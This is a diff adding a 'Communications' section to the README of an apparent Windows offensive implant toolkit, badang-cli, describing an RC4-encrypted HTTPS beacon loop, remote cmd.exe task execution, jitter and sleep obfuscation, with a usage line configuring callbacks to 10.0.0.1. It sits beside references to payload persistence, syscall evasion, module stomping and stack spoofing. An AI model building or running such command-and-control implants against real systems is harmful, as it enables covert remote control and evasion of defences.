@@ -146,6 +146,24 @@ Six persistence techniques for payload survival across reboots. Uses dynamic ADV
 
 Usage: `badang-cli persist --method registry --name UpdateService --payload runner.exe -x -c`
 
+## Communications
+
+Callback loop with encrypted transport for remote task execution. Uses WinINet HTTPS with RC4-encrypted binary wire protocol.
+
+| Channel | Transport | Status |
+|---------|-----------|--------|
+| Secure Web Channel | HTTPS (WinINet) | Operational |
+| Name Resolution Channel | DNS | Planned |
+| Network Share Channel | SMB/Named Pipes | Planned |
+
+**Wire protocol:** Binary little-endian with 3 message types — check-in (agent→server), task list (server→agent), result (agent→server). RC4 encryption layer with configurable hex key.
+
+**Task types:** Shell (cmd.exe /c with pipe capture), sleep interval change, exit signal, no-op.
+
+**Features:** Jittered sleep (configurable %), exponential backoff on errors, max retry limit, optional sleep obfuscation (memory encryption during sleep), 16-byte agent ID generation.
+
+Usage: `badang-cli comms --host 10.0.0.1 --comms-key aabbccdd --interval 30000 --jitter 20 -x -c`
+
 ## PE Helpers
 
 Shared module (`src/pe.rs`) for PE parsing: export table walking, .text section finding, byte pattern scanning. Used by indirect syscalls (`src/syscall/indirect.rs`), module stomping (`src/injection/stomp.rs`), and stack spoofing (`src/evasion/stack_spoof.rs`).
